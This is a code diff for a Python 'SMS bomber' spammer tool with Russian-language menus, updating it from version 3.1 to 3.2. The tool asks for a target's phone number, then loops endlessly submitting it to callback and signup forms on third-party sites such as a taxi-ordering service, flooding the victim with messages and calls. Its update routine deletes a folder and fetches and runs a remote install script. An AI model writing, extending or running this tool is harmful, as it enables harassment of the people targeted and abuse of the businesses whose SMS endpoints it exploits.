@@ -1,41 +1,48 @@
 #!/usr/bin/python3
-# spammer v3.1
-# author: cludeex
+# Spammer v3.2
+# Author: cludeex
 import os, random, time
-try: import requests
-except: os.system("python -m pip install requests; spamer")
-def logo():
-    os.system('cls' if os.name=='nt' else 'clear')
-    print(clr.blt+clr.gn+"  ___ ___  _   __  __ __  __ ___ ___\n / __| _ \\/_\\ |  \\/  |  \\/  | __| _ \\\n \\__ \\  _/ _ \\| |\\/| | |\\/| | _||   /\n |___/_|/_/ \\_\\_|  |_|_|  |_|___|_|_\\"+"\n\n    SMS Bomber: github.com/cludeex\n"+clr.end)
-def update():
-    up = input("Вы уверены, что хотите обновить? (y/n) ")
-    if up == "y":
-        os.system("cd && rm -rf ~/spammer && git clone https://github.com/cludeex/spammer && python ~/spammer/install.py")
-        exit()
+try:
+    import requests
+except:
+    im = input("Установить недостоющие библиотеки? (y/n) ")
+    if im == "y":
+        os.system("python -m pip install requests; spamer")
     else:
         print("Отменено")
+        exit()
+def logo():
+    os.system('cls' if os.name=='nt' else 'clear')
+    print(color.BOLD+color.GREEN+"  ___ ___  _   __  __ __  __ ___ ___\n / __| _ \\/_\\ |  \\/  |  \\/  | __| _ \\\n \\__ \\  _/ _ \\| |\\/| | |\\/| | _||   /\n |___/_|/_/ \\_\\_|  |_|_|  |_|___|_|_\\"+"\n\n     Spammer: github.com/cludeex\n"+color.END)
+def update():
+    logo()
+    up = input(color.BOLD+color.BLUE+"Вы уверены, что хотите обновить? "+color.END+"(y/n) ")
+    if up == "y":
+        os.system("rm -rf spammer && git clone https://github.com/cludeex/spammer && python ~/spammer/install.py")
+    else:
+        print(color.RED+"Отменено"+color.END)
         main(2)
 def main(t):
     time.sleep(t)
     logo()
-    print("[1] СМС СПАМЕР\n[2] ОБНОВИТЬ СПАМЕР.\n[3] ВЫХОД.\n")
-    input1 = input(clr.bl+clr.blt+"Введите номер пункта: "+clr.end)
+    print("[A] СМС СПАМЕР\n[B] ОБНОВИТЬ СПАМЕР.\n[Q] ВЫХОД.\n")
+    input1 = input(color.BOLD+color.BLUE+"Введите номер пункта: "+color.END)
     try:
         requests.get("http://google.com", verify=True)
     except:
         logo()
-        print(clr.blt+clr.rd+"[!] Нет интернет соединения."+clr.end)
+        print(color.BOLD+color.RED+"[!] Нет интернет соединения.")
         main(2)
-    if input1 == "1":
+    if input1.lower() == "a":
         logo()
-        _phone = input(clr.bl+clr.blt+"Введите номер телефона: "+clr.end)
+        _phone = input(color.BOLD+color.BLUE+"Введите номер телефона: "+color.END)
         if _phone == "":
            main(0)
         if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
             pass
         else:
             logo()
-            print(clr.blt+clr.rd+"[!] Неправильный номер."+clr.end)
+            print(color.BOLD+color.RED+"[!] Неправильный номер.")
             main(2)
         if _phone[0] == "+":
             _phone = _phone[1:]
@@ -52,7 +59,7 @@ def main(t):
         _email = _name+"@gmail.com"
         email = _email
         logo()
-        print("Телефон: "+clr.bl+clr.blt+_phone+clr.end+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
+        print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
         while True:
             if _phone[0] == "7":
                 try:
@@ -648,26 +655,28 @@ def main(t):
                     requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
                 except:
                     pass
-    elif input1 == "2":
+    elif input1.lower() == "b":
         update()
-    elif input1 == "3":
+    elif input1.lower() == "q":
        logo()
-       print(clr.bl+clr.blt+"До скорой встречи!\n"+clr.end)
+       print(color.BOLD+color.BLUE+"До скорой встречи!\n"+color.END)
        exit()
     else:
        logo()
-       print(clr.rd+clr.blt+"[!] Не правильный номер пункта.")
+       print(color.BOLD+color.RED+"[!] Не правильный номер пункта.")
        main(2)
-class clr:
-    rd = '\033[91m'
-    gn = '\033[92m'
-    yl = '\033[93m'
-    bl = '\033[94m'
-    mg = '\033[95m'
-    cn = '\033[96m'
-    wh = '\033[97m'
-    gr = '\033[90m'
-    blt = '\033[1m'
-    end = '\033[0m'
+class color:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    GREY = '\033[90m'
+    BOLD = '\033[1m'
+    ITALIC = '\033[3m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
 if __name__ == "__main__":
     main(0)
